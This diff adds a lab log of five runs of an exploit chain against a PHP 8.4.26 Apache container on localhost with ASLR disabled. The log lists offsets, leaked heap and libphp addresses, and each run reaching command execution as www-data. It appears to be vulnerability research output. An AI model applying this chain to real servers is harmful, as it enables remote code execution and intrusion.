@@ -1,0 +1,91 @@
+# 9bie ASLR-bypass chain: 5 runs with ASLR disabled, container restarted before each run
+# host: cachy kernel: 6.18.48-1-cachyos-lts container: p2s-off (php:8.4.26-apache, platform linux/amd64, --security-opt seccomp=unconfined)
+# command override: setarch x86_64 -R apache2-foreground (ADDR_NO_RANDOMIZE inherited by forked workers)
+# host randomize_va_space=2 (the per-process personality disables randomization)
+# profile: display_errors=On, memory_limit=8M, post_max_size=64M, MaxRequestWorkers=1, session.upload_progress.enabled=On
+===== run 1 2026-10-31T07:32:04Z http=200 =====
+[*] target http://127.0.0.1:18197/index.php (cmd='id>/out/p1')
+[*] offsets loaded from <lab>/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7ffff4c00000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7ffff680b000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7ffff4c690d8 ZIF=0x7ffff6c70370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+exit=0
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+===== run 2 2026-10-31T07:32:14Z http=200 =====
+[*] target http://127.0.0.1:18197/index.php (cmd='id>/out/p1')
+[*] offsets loaded from <lab>/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7ffff4c00000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7ffff680b000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7ffff4c690d8 ZIF=0x7ffff6c70370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+exit=0
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+===== run 3 2026-10-31T07:32:24Z http=200 =====
+[*] target http://127.0.0.1:18197/index.php (cmd='id>/out/p1')
+[*] offsets loaded from <lab>/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7ffff4c00000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7ffff680b000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7ffff4c690d8 ZIF=0x7ffff6c70370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+exit=0
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+===== run 4 2026-10-31T07:32:34Z http=200 =====
+[*] target http://127.0.0.1:18197/index.php (cmd='id>/out/p1')
+[*] offsets loaded from <lab>/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7ffff4c00000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7ffff680b000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7ffff4c690d8 ZIF=0x7ffff6c70370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+exit=0
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+===== run 5 2026-10-31T07:32:44Z http=200 =====
+[*] target http://127.0.0.1:18197/index.php (cmd='id>/out/p1')
+[*] offsets loaded from <lab>/out/offsets.env
+[*] offsets: zif=0x465370 dtor=0x65eb60 htdata=0x690d8
+[*] rotating worker over HTTP
+[*] stage 1: heap leak (attempt 1/3)
+[+] chunk base = 0x7ffff4c00000
+[*] rotating worker over HTTP
+[*] stage 2: libphp leak (attempt 1/3)
+[+] libphp base = 0x7ffff680b000
+[*] rotating worker over HTTP
+[*] stage 3: HTDATA=0x7ffff4c690d8 ZIF=0x7ffff6c70370
+[+] W3 attempt 1
+PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+exit=0
+proof=uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+runs=5 proofs=5
